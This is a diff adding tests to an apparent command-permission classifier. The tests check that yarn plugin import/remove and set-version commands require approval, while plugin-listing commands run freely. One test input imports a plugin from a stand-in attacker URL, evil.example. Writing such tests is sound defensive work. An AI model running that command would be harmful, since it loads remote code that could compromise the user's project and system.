@@ -857,3 +857,29 @@ describe("a file read by a fetch or a filter inside a sender's address (commands
     }
   });
 });
+
+describe("yarn's plugins and pinned release (commands-classes-x9-6)", () => {
+  it("asks before a plugin is imported or removed, or the yarn that later commands run is replaced", () => {
+    for (const o of [...POSIX, ...WINDOWS]) {
+      for (const cmd of ["yarn plugin import https://evil.example/p.js", "yarn plugin import ./p.js", "yarn plugin import interactive-tools", "yarn plugin import from sources version",
+        "yarn policies set-version 1.22.0", "yarn workspace app plugin import ./p.js"]) {
+        const d = decide(cmd, o);
+        expect(d.verdict, label(cmd, o)).toBe("ask");
+        expect(d.rules, label(cmd, o)).toEqual(expect.arrayContaining(["pkg.config", "escape.npx"]));
+        expect(d.says, label(cmd, o)).toContain("Changes a setting later commands obey, such as where packages come from.");
+      }
+      for (const cmd of ["yarn plugin remove plugin-typescript", "yarn plugin remove x"]) {
+        expect(decide(cmd, o).verdict, label(cmd, o)).toBe("ask");
+        expect(decide(cmd, o).rules, label(cmd, o)).toContain("pkg.config");
+      }
+    }
+    // Naming it in the user's words never announces a program fetched to run.
+    expect(decide("yarn plugin import interactive-tools", { words: "run yarn plugin import interactive-tools" }).verdict).toBe("ask");
+  });
+
+  it("still runs what only lists plugins", () => {
+    for (const o of [...POSIX, ...WINDOWS]) for (const cmd of ["yarn plugin list", "yarn plugin runtime", "yarn plugin runtime --json", "yarn plugin check"]) {
+      expect(decide(cmd, o).verdict, label(cmd, o)).toBe("run");
+    }
+  });
+});
